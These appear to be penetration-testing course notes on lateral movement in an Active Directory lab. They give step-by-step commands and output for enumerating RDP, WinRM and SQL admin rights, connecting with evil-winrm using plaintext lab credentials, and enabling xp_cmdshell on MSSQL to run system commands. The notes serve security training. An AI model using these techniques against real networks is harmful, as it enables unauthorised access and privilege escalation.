


# Privileged Access

After gaining initial domain access, we advance by moving laterally or vertically to compromise other hosts. With local admin rights, we can use `Pass-the-Hash` attacks via SMB.

**Without local admin rights**, we can use:
* `RDP` - GUI-based remote access to target hosts
* PowerShell Remoting (PSRemoting/WinRM) - Execute commands or interactive sessions remotely
* `MSSQL Server` - sysadmin accounts can execute OS commands through the SQL Server service

**Enumeration**: BloodHound identifies these privileges via edges (CanRDP, CanPSRemote, SQLAdmin). PowerView and built-in tools also work for enumeration.

---

## Remote Desktop

With local admin rights, we can typically access machines via RDP. However, we may gain a foothold with a user lacking local admin but having RDP rights to one or more machines.

**This access enables us to:**
* Launch further attacks
* Escalate privileges to obtain higher-privileged credentials
* Extract sensitive data or credentials from the host

**Enumeration**: Use PowerView's `Get-NetLocalGroupMember` function to enumerate members of the `Remote Desktop Users` group on target hosts.

### Enumerating the Remote Desktop Users Group

```
PS C:\htb> Get-NetLocalGroupMember -ComputerName ACADEMY-EA-MS01 -GroupName "Remote Desktop Users"

ComputerName : ACADEMY-EA-MS01
GroupName    : Remote Desktop Users
MemberName   : INLANEFREIGHT\Domain Users
SID          : S-1-5-21-3842939050-3880317879-2865463114-513
IsGroup      : True
IsDomain     : UNKNOWN
```

This shows `all` domain users can RDP to this host—common on RDS or jump hosts. These heavily-used servers may contain:
* Sensitive data or credentials for further access
* Local privilege escalation vectors leading to admin access and credential theft

**Key BloodHound Check**: Does the Domain Users group have local admin rights or execution rights (RDP/WinRM) over any hosts?

**Checking the Domain Users Group's Local Admin & Execution Rights using BloodHound**
<img width="1481" height="699" alt="image" src="https://github.com/user-attachments/assets/67bcdf5f-22e7-4cc8-9785-3544a390a3ff" />

If we gain control over a user through an attack such as LLMNR/NBT-NS Response Spoofing or Kerberoasting, we can search for the username in BloodHound to check what type of remote access rights they have either directly or inherited via group membership under `Execution Rights` on the `Node Info` tab.

**Checking Remote Access Rights using BloodHound**
<img width="548" height="345" alt="image" src="https://github.com/user-attachments/assets/75f182c6-e416-4d77-b5f5-aec3c0956c3e" />

We could also check the `Analysis` tab and run the pre-built queries `Find Workstations where Domain Users can RDP` or `Find Servers where Domain Users can RDP`. Then, to test this access, we can either use a tool such as `xfreerdp` or `Remmina` or `mstsc.exe` if attacking from a Windows host.

---

## WinRM

Similar to RDP, specific users or groups may have WinRM access to hosts. This could be low-privileged access useful for hunting sensitive data or privilege escalation, or it may provide local admin access for further domain advancement.

**Enumeration**: Use PowerView's `Get-NetLocalGroupMember` function to check the `Remote Management Users` group. This group (introduced in Windows 8/Server 2012) enables WinRM access without granting local admin rights.

### Enumerating the Remote Management Users Group

```
PS C:\htb> Get-NetLocalGroupMember -ComputerName ACADEMY-EA-MS01 -GroupName "Remote Management Users"

ComputerName : ACADEMY-EA-MS01
GroupName    : Remote Management Users
MemberName   : INLANEFREIGHT\forend
SID          : S-1-5-21-3842939050-3880317879-2865463114-5614
IsGroup      : False
IsDomain     : UNKNOWN
```

We can also utilize this custom `Cypher query` in BloodHound to hunt for users with this type of access. This can be done by pasting the query into the `Raw Query` box at the bottom of the screen and hitting enter.

```
MATCH p1=shortestPath((u1:User)-[r1:MemberOf*1..]->(g1:Group)) MATCH p2=(u1)-[:CanPSRemote*1..]->(c:Computer) RETURN p2
```

**Using the Cypher Query in BloodHound**
<img width="2140" height="866" alt="image" src="https://github.com/user-attachments/assets/28a9657b-37df-42ba-88ef-2598a184911e" />

We could also add this as a custom query to our BloodHound installation, so it's always available to us.

**Adding the Cypher Query as a Custom Query in BloodHound**
<img width="1336" height="225" alt="image" src="https://github.com/user-attachments/assets/e5ae13c9-ece2-412d-8721-347f40e4689e" />

We can use the [Enter-PSSession](https://learn.microsoft.com/en-us/powershell/module/microsoft.powershell.core/enter-pssession?view=powershell-7.5&viewFallbackFrom=powershell-7.2) cmdlet using PowerShell from a Windows host.

### Establishing WinRM Session from Windows

```
PS C:\htb> $password = ConvertTo-SecureString "Klmcargo2" -AsPlainText -Force
PS C:\htb> $cred = new-object System.Management.Automation.PSCredential ("INLANEFREIGHT\forend", $password)
PS C:\htb> Enter-PSSession -ComputerName ACADEMY-EA-MS01 -Credential $cred

[ACADEMY-EA-MS01]: PS C:\Users\forend\Documents> hostname
ACADEMY-EA-MS01
[ACADEMY-EA-MS01]: PS C:\Users\forend\Documents> Exit-PSSession
PS C:\htb>
```

From our **Linux** attack host, we can use the tool `evil-winrm` to connect. We can connect with just an IP address and valid credentials.

### Connecting to a Target with Evil-WinRM and Valid Credentials

```
$ evil-winrm -i 10.129.201.234 -u forend

Enter Password: 

Evil-WinRM shell v3.3

Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine

Data: For more information, check Evil-WinRM Github: https://github.com/Hackplayers/evil-winrm#Remote-path-completion

Info: Establishing connection to remote endpoint

*Evil-WinRM* PS C:\Users\forend.INLANEFREIGHT\Documents> hostname
ACADEMY-EA-MS01
```

---

## SQL Server Admin

SQL servers are commonly found in environments, often with user/service accounts having sysadmin privileges on instances.

**We may obtain credentials for an account with this access via:**
* Kerberoasting (common)
* LLMNR/NBT-NS Response Spoofing
* Password spraying
* Configuration files (web.config, etc.) containing connection strings—use tools like Snaffler to find these

BloodHound, once again, is a great bet for finding this type of access via the `SQLAdmin` edge. We can check for `SQL Admin Rights` in the `Node Info` tab for a given user or use this custom Cypher query to search:

```
MATCH p1=shortestPath((u1:User)-[r1:MemberOf*1..]->(g1:Group)) MATCH p2=(u1)-[:SQLAdmin*1..]->(c:Computer) RETURN p2
```

Here we see one user, `damundsen` has `SQLAdmin` rights over the host `ACADEMY-EA-DB01`.

**Using a Custom Cypher Query to Check for SQL Admin Rights in BloodHound**
<img width="2140" height="838" alt="image" src="https://github.com/user-attachments/assets/9de114fc-a545-43b5-a6c9-55151f785e7e" />

We can use our ACL rights to authenticate with the `wley` user, change the password for the `damundsen` user and then authenticate with the target using a tool such as `PowerUpSQL`, which has a handy [command cheat sheet](https://github.com/NetSPI/PowerUpSQL/wiki/PowerUpSQL-Cheat-Sheet). 

Let's assume we changed the account password to `SQL1234!` using our ACL rights. We can now authenticate and run operating system commands.

First, let's hunt for SQL server instances.

### Enumerating MSSQL Instances with PowerUpSQL

```
PS C:\htb> cd .\PowerUpSQL\
PS C:\htb>  Import-Module .\PowerUpSQL.ps1
PS C:\htb>  Get-SQLInstanceDomain

ComputerName     : ACADEMY-EA-DB01.INLANEFREIGHT.LOCAL
Instance         : ACADEMY-EA-DB01.INLANEFREIGHT.LOCAL,1433
DomainAccountSid : 1500000521000170152142291832437223174127203170152400
DomainAccount    : damundsen
DomainAccountCn  : Dana Amundsen
Service          : MSSQLSvc
Spn              : MSSQLSvc/ACADEMY-EA-DB01.INLANEFREIGHT.LOCAL:1433
LastLogon        : 4/6/2022 11:59 AM
```

We could then authenticate against the remote SQL server host and run custom queries or operating system commands.
```
PS C:\htb>  Get-SQLQuery -Verbose -Instance "172.16.5.150,1433" -username "inlanefreight\damundsen" -password "SQL1234!" -query 'Select @@version'

VERBOSE: 172.16.5.150,1433 : Connection Success.

Column1
-------
Microsoft SQL Server 2017 (RTM) - 14.0.1000.169 (X64) ...
```

We can also authenticate from our Linux attack host using `mssqlclient.py` from the **Impacket** toolkit.

### Running mssqlclient.py Against the Target

```
$ mssqlclient.py INLANEFREIGHT/DAMUNDSEN@172.16.5.150 -windows-auth
Impacket v0.9.25.dev1+20220311.121550.1271d369 - Copyright 2021 SecureAuth Corporation

Password:
[*] Encryption required, switching to TLS
[*] ENVCHANGE(DATABASE): Old Value: master, New Value: master
[*] ENVCHANGE(LANGUAGE): Old Value: , New Value: us_english
[*] ENVCHANGE(PACKETSIZE): Old Value: 4096, New Value: 16192
[*] INFO(ACADEMY-EA-DB01\SQLEXPRESS): Line 1: Changed database context to 'master'.
[*] INFO(ACADEMY-EA-DB01\SQLEXPRESS): Line 1: Changed language setting to us_english.
[*] ACK: Result: 1 - Microsoft SQL Server (140 3232) 
[!] Press help for extra shell commands
```

Once connected, we could type `help` to see what commands are available to us.
```
SQL> help

     lcd {path}                 - changes the current local directory to {path}
     exit                       - terminates the server process (and this session)
     enable_xp_cmdshell         - you know what it means
     disable_xp_cmdshell        - you know what it means
     xp_cmdshell {cmd}          - executes cmd using xp_cmdshell
     sp_start_job {cmd}         - executes cmd using the sql server agent (blind)
     ! {cmd}                    - executes a local shell cmd
```

We could then choose `enable_xp_cmdshell` to enable the xp_cmdshell stored procedure which allows for one to execute operating system commands via the database if the account in question has the proper access rights.

### Choosing enable_xp_cmdshell

```
SQL> enable_xp_cmdshell

[*] INFO(ACADEMY-EA-DB01\SQLEXPRESS): Line 185: Configuration option 'show advanced options' changed from 0 to 1. Run the RECONFIGURE statement to install.
[*] INFO(ACADEMY-EA-DB01\SQLEXPRESS): Line 185: Configuration option 'xp_cmdshell' changed from 0 to 1. Run the RECONFIGURE statement to install.
```

Finally, we can run commands in the format `xp_cmdshell <command>`. Here we can enumerate the rights that our user has on the system and see that we have SeImpersonatePrivilege, which can be leveraged in combination with a tool such as JuicyPotato, PrintSpoofer, or RoguePotato to escalate to `SYSTEM` level privileges, depending on the target host, and use this access to continue toward our goal.

### Enumerating our Rights on the System using xp_cmdshell

```
xp_cmdshell whoami /priv
output                                                                             

--------------------------------------------------------------------------------   

NULL                                                                               

PRIVILEGES INFORMATION                                                             

----------------------                                                             

NULL                                                                               

Privilege Name                Description                               State      

============================= ========================================= ========   

SeAssignPrimaryTokenPrivilege Replace a process level token             Disabled   

SeIncreaseQuotaPrivilege      Adjust memory quotas for a process        Disabled   

SeChangeNotifyPrivilege       Bypass traverse checking                  Enabled    

SeManageVolumePrivilege       Perform volume maintenance tasks          Enabled    

SeImpersonatePrivilege        Impersonate a client after authentication Enabled    

SeCreateGlobalPrivilege       Create global objects                     Enabled    

SeIncreaseWorkingSetPrivilege Increase a process working set            Disabled   

NULL
```

---

# Kerberos "Double Hop" Problem

The "Double Hop" problem occurs when attempting Kerberos authentication across two or more hops. 

**The Issue**: Kerberos tickets are signed data from the KDC granting access to specific resources—not passwords. When authenticating with Kerberos, you receive a "ticket" for the requested resource (e.g., a single machine only). 

**Contrast with NTLM**: Password authentication stores the NTLM hash in your session, allowing reuse elsewhere without restrictions.

---

## Background

The "Double Hop" problem commonly occurs with WinRM/PowerShell because default authentication only provides a ticket for a specific resource, causing issues with lateral movement or file share access. The user has rights but is denied access.

**Common Shell Methods:**
* Exploiting applications on target hosts
* Using credentials with tools like PSExec

Both typically authenticate via SMB/LDAP, storing the user's NTLM hash in memory.

**The Core Issue**: With WinRM over multiple connections, the user's password is never cached. Mimikatz shows blank credentials because Kerberos doesn't use password authentication. Unlike password authentication (e.g., PSExec), which stores the NTLM hash in session memory for subsequent resource access, Kerberos tickets don't provide this capability.
